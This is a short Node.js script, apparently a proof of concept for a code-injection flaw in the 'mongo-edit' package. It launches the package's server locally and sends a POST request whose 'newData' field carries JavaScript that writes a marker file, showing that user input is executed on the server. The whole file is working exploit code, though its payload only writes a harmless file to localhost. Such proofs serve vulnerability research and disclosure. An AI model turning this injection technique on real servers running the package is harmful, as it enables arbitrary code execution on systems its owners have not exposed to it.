var edit = require("mongo-edit");
edit.launchServer();
var request = require("request");

setTimeout(function () {
  request(
    {
      url: "http://localhost:2762/blog/12",
      method: "POST",
      json: true,
      body: {
        newData: 'require("fs").writeFileSync("mongo-edit-success.txt","23")',
      },
    },
    function (error, response, body) {
      process.exit(1);
    }
  );
}, 1000);
